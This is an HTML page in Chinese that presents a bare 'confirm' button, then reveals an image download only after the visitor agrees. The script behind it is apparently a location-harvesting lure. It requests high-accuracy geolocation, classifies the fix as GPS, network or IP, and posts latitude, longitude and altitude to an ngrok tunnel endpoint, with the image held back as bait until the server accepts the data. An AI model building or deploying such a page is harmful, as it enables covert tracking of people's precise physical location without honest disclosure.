<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>确认操作</title>
    <link rel="icon" href="tb.ico">
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        #agree-btn, #download-btn {
            display: block;
            margin: 20px auto;
            padding: 10px 20px;
            border: none;
            background-color: #add8e6;
            color: #fff;
            border-radius: 12px;
            cursor: pointer;
            font-size: 16px;
        }
        #download-btn {
            display: none;
        }
        #preview-container {
            display: none;
            margin-top: 20px;
            width: 150px;
            height: 150px;
            border: 1px solid #ddd;
            overflow: hidden;
            margin-left: auto;
            margin-right: auto;
        }
        #preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        #spinner {
            display: none;
            margin: 20px auto;
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #error-message {
            color: red;
            display: none;
        }
    </style>
</head>
<body>
    <h1>确认操作</h1>
    <button id="agree-btn">确认</button>
    <div id="spinner"></div>
    <div id="error-message">没有请求返回，请重新发送。</div>
    <div id="preview-container">
        <img id="preview" src="1.png" alt="预览图片">
    </div>
    <button id="download-btn" download="1.png">下载图片</button>

    <script>
        const agreeBtn = document.getElementById('agree-btn');
        const downloadBtn = document.getElementById('download-btn');
        const previewContainer = document.getElementById('preview-container');
        const previewImg = document.getElementById('preview');
        const spinner = document.getElementById('spinner');
        const errorMessage = document.getElementById('error-message');

        let timeoutId;

        agreeBtn.addEventListener('click', () => {
            // 隐藏确认按钮，防止重复点击
            agreeBtn.style.display = 'none';
            errorMessage.style.display = 'none';
            spinner.style.display = 'block';
            
            // 启动30秒计时器，显示没有返回信息
            timeoutId = setTimeout(() => {
                spinner.style.display = 'none';
                agreeBtn.style.display = 'block'; // 重新显示确认按钮
                errorMessage.style.display = 'block';
            }, 30000);

            if (navigator.geolocation) {
                // 获取地理位置
                navigator.geolocation.getCurrentPosition(position => {
                    clearTimeout(timeoutId);
                    spinner.style.display = 'none';

                    const { latitude, longitude, accuracy, altitude } = position.coords;
                    let locationType = "未知";
                    let alt = "不可用"; // 默认海拔值

                    // 判断定位方式
                    if (accuracy <= 20) {
                        locationType = "GPS"; 
                    } else if (accuracy > 20 && accuracy <= 100) {
                        locationType = "网络";
                    } else {
                        locationType = "IP";
                    }

                    // 检查是否有有效的海拔数据
                    if (altitude !== null && !isNaN(altitude) && altitude !== 5e-324) {
                        alt = altitude; // 只有有效海拔才显示
                    }

                    // 输出调试信息（开发时查看）
                    console.log(`纬度: ${latitude}, 经度: ${longitude}, 海拔: ${alt}, 定位方式: ${locationType}`);

                    // 将数据发送到后台
                    fetch('https://fitting-flexible-orca.ngrok-free.app/location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ latitude, longitude, altitude: alt, locationType }),
                    }).then(response => {
                        if (response.ok) {
                            // 后台确认成功后显示下载和预览
                            previewContainer.style.display = 'block';
                            downloadBtn.style.display = 'block';
                        } else {
                            agreeBtn.style.display = 'block'; // 重新显示确认按钮
                        }
                    }).catch(() => {
                        agreeBtn.style.display = 'block'; // 重新显示确认按钮
                        errorMessage.style.display = 'block';
                    });
                }, (error) => {
                    clearTimeout(timeoutId);
                    spinner.style.display = 'none';
                    agreeBtn.style.display = 'block'; // 重新显示确认按钮
                    console.error('获取地理位置失败:', error);
                    errorMessage.style.display = 'block';
                }, {
                    enableHighAccuracy: true, // 启用高精度获取数据
                    timeout: 10000,
                    maximumAge: 0
                });
            }
        });

        downloadBtn.addEventListener('click', () => {
            // 设置下载图片的链接
            const a = document.createElement('a');
            a.href = '1.png';
            a.download = '1.png'; // 强制下载图片
            a.click();
        });
    </script>
</body>
</html>
